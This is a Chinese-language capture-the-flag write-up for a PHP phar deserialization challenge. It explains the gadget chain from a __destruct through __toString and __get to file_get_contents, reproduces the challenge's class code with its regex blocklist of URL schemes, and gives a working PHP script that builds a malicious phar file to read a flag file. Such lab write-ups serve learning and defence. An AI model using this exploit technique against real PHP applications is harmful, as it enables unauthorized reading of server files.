# buu1
#在此记录一个phar反序列化的题，是buu的swpu的题
利用条件：
-phar文件能够上传到服务器
 
-要有可用的魔术方法作为“跳板”
 
-文件操作函数的参数可控，且：/ \ 等特殊字符没有被过滤
 
有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下

进去题目之后主要就是一顿包含然后找到源码
最后能看到base.php中的/flag的提示
然后回到class.php中，在这里面进行反序列化，首先找到一个入口一个出口，先快速的找能利用的函数，可以控制参数的地方，很明显看到一个file_get_contents,那么如何利用这个函数呢？
找链子，想要调用这个函数就观察里面的参数，一级级往上找就行，最后能到__get这个魔术方法，想要调用这个方法的话，需要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法，想要调用这个方法又要将一个类当做字符串来调用，能看到最上面有一个destruct函数，只有把一个类附上去，然后echo出来就可以调用了，链子找完了之后就可以进行具体的exp构造了，这里利用phar反序列化，首先说下大致流程，先还是序列化，然后将恶意代码保存到phar文件中，最后再phar协议来解析他，文件包含，拿到权限。
class.php
##########################################################################
class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
 
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
#######################################################

exp：
#######################################################
?php
class C1e4r
{
    public $test;
    public $str;
}
 
class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
 
}
$a= new C1e4r();
$b= new Show();
$c= new Test();
$c->params['source'] = "/var/www/html/f1ag.php";
$a->str = $b;
$b->str['str'] = $c;
$phar = new Phar("exp.phar"); //生成phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
$phar->setMetadata($a); //触发头是C1e4r类
$phar->addFromString("exp.txt", "test"); //生成签名
$phar->stopBuffering();
?>
###################################################################
